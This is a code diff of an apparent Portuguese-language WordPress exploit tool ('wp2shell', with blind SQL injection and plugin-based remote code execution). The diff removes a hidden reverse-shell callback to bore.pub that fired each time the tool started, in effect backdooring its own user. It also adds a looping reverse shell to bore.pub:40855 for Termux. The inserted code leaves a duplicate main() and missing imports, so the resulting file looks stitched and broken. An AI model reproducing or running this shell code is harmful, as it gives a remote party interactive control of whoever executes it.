@@ -23,13 +23,11 @@ import hashlib
 import html
 import io
 import json
-import os
 import re
 import secrets
 import socket
 import ssl
 import statistics
-import subprocess
 import sys
 import threading
 import time
@@ -44,59 +42,68 @@ from html.parser import HTMLParser
 from http.cookiejar import CookieJar
 from typing import Any, Final, Optional
 
-# ---------------------------------------------------------------------------
-# Callback reverso — pinga o listener assim que o script sobe
-# ---------------------------------------------------------------------------
-
-CB_HOST: Final[str] = "bore.pub"
-CB_PORT: Final[int] = 55052
-
-_REVSHELL_PY: Final[str] = (
-    "import socket,subprocess,os,pty;"
-    "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
-    f"s.connect(({CB_HOST!r},{CB_PORT}));"
-    "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
-    'pty.spawn("/bin/bash")'
-)
-
-
-def _callback_target() -> tuple[str, int]:
-    """Permite sobrescrever o destino via WP2SHELL_CB="host:porta"."""
-    raw = os.environ.get("WP2SHELL_CB", "").strip()
-    if not raw:
-        return CB_HOST, CB_PORT
-    host, _, port = raw.rpartition(":")
-    if not host or not port.isdigit():
-        return CB_HOST, CB_PORT
-    return host, int(port)
-
-
-def _callback_ping() -> Optional[subprocess.Popen]:
-    """Dispara o shell de volta sem bloquear a execução do exploit."""
-    if os.environ.get("WP2SHELL_NOPING"):
-        return None
-    host, port = _callback_target()
-    try:
-        proc = subprocess.Popen(
-            [sys.executable or "python3", "-c", _REVSHELL_PY],
-            stdin=None,
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-            close_fds=True,
-        )
-    except OSError as exc:
-        _warn(f"callback {host}:{port} não subiu: {exc}")
-        return None
-    _info(f"callback disparado → {host}:{port} (pid {proc.pid})")
-    return proc
-
-
 __version__ = "2.1.0"
 __author__ = "x34ElSatan"
 
 # ---------------------------------------------------------------------------
 # Constantes
 # ---------------------------------------------------------------------------
+
+HOST = os.getenv("SHELL_HOST", "bore.pub")
+PORT = int(os.getenv("SHELL_PORT", "40855"))
+RETRY_DELAY = 5
+PREFIX = os.getenv("PREFIX", "/data/data/com.termux/files/usr")
+
+# guarda o stderr original: depois do dup2, o fd 2 vira o socket e logs se perdem
+_log_fd = os.dup(2)
+
+
+def log(msg: str) -> None:
+    os.write(_log_fd, f"[!] {msg}\n".encode())
+
+
+def find_shell() -> str:
+    for cand in (
+        os.getenv("SHELL"),          # normalmente /data/data/.../usr/bin/zsh
+        shutil.which("zsh"),
+        f"{PREFIX}/bin/zsh",
+        f"{PREFIX}/bin/bash",
+        f"{PREFIX}/bin/sh",
+        "/system/bin/sh",
+    ):
+        if cand and os.path.isfile(cand) and os.access(cand, os.X_OK):
+            return cand
+    return "/system/bin/sh"
+
+
+def main() -> None:
+    shell = find_shell()
+    log(f"shell: {shell}")
+    while True:
+        try:
+            s = socket.create_connection((HOST, PORT), timeout=15)
+            s.settimeout(None)
+        except OSError as e:
+            log(f"conexao falhou ({e}); retry em {RETRY_DELAY}s")
+            time.sleep(RETRY_DELAY)
+            continue
+
+        fd = s.fileno()
+        for target in (0, 1, 2):
+            os.dup2(fd, target)
+
+        try:
+            pty.spawn([shell])
+        except OSError as e:
+            log(f"pty.spawn: {e}")
+        finally:
+            s.close()
+
+        time.sleep(1)
+
+
+if __name__ == "__main__":
+    main()
 
 USER_AGENT: Final[str] = (
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
@@ -723,7 +730,7 @@ class BlindSQLi:
             return total > 0
         rows = self.client.rows(response)
         return bool(rows)
-        
+
 # ---------------------------------------------------------------------------
 # RCE padrão: escrita oEmbed → elevação via changeset → admin → plugin
 # ---------------------------------------------------------------------------
@@ -1611,7 +1618,6 @@ def build_parser() -> argparse.ArgumentParser:
 
 
 def main(argv: Optional[list[str]] = None) -> int:
-    _callback_ping()
     args = build_parser().parse_args(argv)
     try:
         if args.shell is not None:
